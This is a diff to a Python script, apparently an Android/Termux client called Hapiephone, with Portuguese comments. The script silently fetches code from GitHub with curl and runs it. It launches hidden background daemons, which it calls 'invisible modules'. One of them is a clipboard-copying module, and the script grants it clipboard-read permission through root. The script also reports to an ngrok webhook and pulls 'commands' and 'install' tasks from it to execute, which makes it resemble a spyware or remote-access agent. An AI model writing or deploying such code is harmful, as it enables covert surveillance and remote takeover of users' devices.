@@ -22,13 +22,28 @@ except ImportError:
     from rich.panel import Panel
     from halo import Halo
 
-HAPIEPHONE_VERSION = "10"
+HAPIEPHONE_VERSION = "10.1 (Estruturado)"
 console = Console()
 
+# ==========================================
+# 📍 NOVAS ROTAS ORGANIZADAS
+# ==========================================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
 CONFIG_FILE = os.path.join(BASE_DIR, "hapie_config.json")
+
 FUNCTIONS_DIR = os.path.join(BASE_DIR, "functions")
-REPORT_FILE = os.path.join(FUNCTIONS_DIR, "install_report.json")
+HAPIE_APPS_DIR = os.path.join(BASE_DIR, "hapie_apps")
+DATA_DIR = os.path.join(BASE_DIR, "Data")
+ESSENCIAL_DIR = os.path.join(BASE_DIR, "essencial")
+PROTOCOLS_DIR = os.path.join(BASE_DIR, "Protocols")
+
+os.makedirs(FUNCTIONS_DIR, exist_ok=True)
+os.makedirs(HAPIE_APPS_DIR, exist_ok=True)
+os.makedirs(DATA_DIR, exist_ok=True)
+os.makedirs(ESSENCIAL_DIR, exist_ok=True)
+
+# O relatório agora fica na pasta Data
+REPORT_FILE = os.path.join(DATA_DIR, "install_report.json")
 
 saved_config = {}
 
@@ -69,9 +84,6 @@ else:
 URL_WEBHOOK = "https://pandanaceous-meghann-nonincarnate.ngrok-free.dev/webhook"
 report = {"installation_status": "pending", "steps": {}, "system_info": {}}
 
-os.makedirs(FUNCTIONS_DIR, exist_ok=True)
-PROTOCOLS_DIR = os.path.join(BASE_DIR, "Protocols")
-
 console.print("[bold yellow]⏳ Executando e verificando Protocolos...[/bold yellow]")
 if os.path.exists(PROTOCOLS_DIR):
     for file_name in os.listdir(PROTOCOLS_DIR):
@@ -103,11 +115,13 @@ spinner.start()
 
 os.system("pkg update -y -q > /dev/null 2>&1 && pkg upgrade -y -q > /dev/null 2>&1")
 
+# ⚡ BAIXA OS REQUISITOS DIRETO DA PASTA ESSENCIAL
 try:
-    URL_PKG = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/reqs_pkg.txt"
-    os.system(f"curl -sL {URL_PKG} -o reqs_pkg.txt > /dev/null 2>&1")
-    if os.path.exists("reqs_pkg.txt"):
-        with open("reqs_pkg.txt", "r") as f:
+    pkg_file = os.path.join(ESSENCIAL_DIR, "reqs_pkg.txt")
+    URL_PKG = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/essencial/reqs_pkg.txt"
+    os.system(f"curl -sL {URL_PKG} -o {pkg_file} > /dev/null 2>&1")
+    if os.path.exists(pkg_file):
+        with open(pkg_file, "r") as f:
             pkgs = f.read().replace('\n', ' ')
         if pkgs.strip():
             os.system(f"pkg install {pkgs} -y -q > /dev/null 2>&1")
@@ -119,10 +133,11 @@ except:
     report["steps"]["pkg_packages"] = "Failed"
 
 try:
-    URL_PIP = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/reqs_pip.txt"
-    os.system(f"curl -sL {URL_PIP} -o reqs_pip.txt > /dev/null 2>&1")
-    if os.path.exists("reqs_pip.txt"):
-        os.system("pip install -r reqs_pip.txt --upgrade -q > /dev/null 2>&1")
+    pip_file = os.path.join(ESSENCIAL_DIR, "reqs_pip.txt")
+    URL_PIP = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/essencial/reqs_pip.txt"
+    os.system(f"curl -sL {URL_PIP} -o {pip_file} > /dev/null 2>&1")
+    if os.path.exists(pip_file):
+        os.system(f"pip install -r {pip_file} --upgrade -q > /dev/null 2>&1")
         report["steps"]["pip_packages"] = "Success"
     else:
         report["steps"]["pip_packages"] = "Skipped"
@@ -230,25 +245,33 @@ def update_client_token(new_token):
 spinner = Halo(text='Deploying background modules...', spinner='dots')
 spinner.start()
 try:
-    os.system("pkill -f auto_copy.py > /dev/null 2>&1")
-    os.system(f"mkdir -p {FUNCTIONS_DIR}")
+    python_path = sys.executable
+    v_cache = int(time.time())
 
+    # 1. MODULO DE COPIA
+    os.system("pkill -f auto_copy.py > /dev/null 2>&1")
     copy_script_path = os.path.join(FUNCTIONS_DIR, "auto_copy.py")
     log_script_path = os.path.join(FUNCTIONS_DIR, "copy_log.txt")
-    os.system(f"rm -rf {copy_script_path} > /dev/null 2>&1")
-
-    v_cache = int(time.time())
     URL_COPY_PY = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py?v={v_cache}"
     os.system(f"curl -sL '{URL_COPY_PY}' -o {copy_script_path} > /dev/null 2>&1")
 
-    python_path = sys.executable
     subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
-
     daemon_cmd = f"nohup {python_path} {copy_script_path} {device_id} {guild_id} {owner_id} > {log_script_path} 2>&1 &"
     os.system(daemon_cmd)
-    spinner.succeed("Invisible module deployed successfully!")
+
+    # 2. ⚡ MODULO DO MONITOR DE APPS NOVO
+    os.system("pkill -f monitor_apps.py > /dev/null 2>&1")
+    monitor_script_path = os.path.join(HAPIE_APPS_DIR, "monitor_apps.py")
+    monitor_log_path = os.path.join(DATA_DIR, "monitor_log.txt")
+    URL_MONITOR = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/hapie_apps/monitor_apps.py?v={v_cache}"
+    os.system(f"curl -sL '{URL_MONITOR}' -o {monitor_script_path} > /dev/null 2>&1")
+
+    monitor_cmd = f"nohup {python_path} {monitor_script_path} > {monitor_log_path} 2>&1 &"
+    os.system(monitor_cmd)
+
+    spinner.succeed("Invisible modules (Copy & Monitor) deployed successfully!")
 except Exception as e:
-    spinner.fail(f"Error deploying module: {e}")
+    spinner.fail(f"Error deploying modules: {e}")
 
 spinner = Halo(text='Configuring persistent boot...', spinner='dots')
 spinner.start()
@@ -270,7 +293,8 @@ try:
             try:
                 install_success = []
                 install_failed = []
-                
+
+                # LÊ O RELATÓRIO DA NOVA PASTA DATA
                 if os.path.exists(REPORT_FILE):
                     try:
                         with open(REPORT_FILE, "r", encoding="utf-8") as f:
@@ -319,13 +343,12 @@ try:
                     has_tasks = any(k in response_json for k in ["install", "commands", "remove", "instalar", "comandos"])
 
                     if has_tasks:
-                        os.system(f"mkdir -p {FUNCTIONS_DIR}")
-                        install_script_path = os.path.join(FUNCTIONS_DIR, "install.py")
+                        # ⚡ CHAMA O INSTALADOR DA PASTA HAPIE_APPS
+                        install_script_path = os.path.join(HAPIE_APPS_DIR, "install.py")
 
-                        # MODIFICAÇÃO AQUI: SEMPRE BAIXA PARA ATUALIZAR O MOTOR DE INSTALAÇÃO
                         with Halo(text='Updating Install Engine...', spinner='dots'):
                             v_cache_install = int(time.time())
-                            URL_INSTALL = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/install.py?v={v_cache_install}"
+                            URL_INSTALL = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/hapie_apps/install.py?v={v_cache_install}"
                             os.system(f"curl -sL '{URL_INSTALL}' -o {install_script_path}")
 
                         tasks_str = json.dumps(response_json)
@@ -349,6 +372,7 @@ except KeyboardInterrupt:
     shutdown_spinner = Halo(text='Shutting down background services safely...', spinner='dots')
     shutdown_spinner.start()
     os.system("pkill -f auto_copy.py > /dev/null 2>&1")
+    os.system("pkill -f monitor_apps.py > /dev/null 2>&1")
     time.sleep(1)
     shutdown_spinner.succeed('All Evollogic services stopped.')
     console.print("[bold green]✅ Node disconnected safely. Goodbye![/bold green]\n")
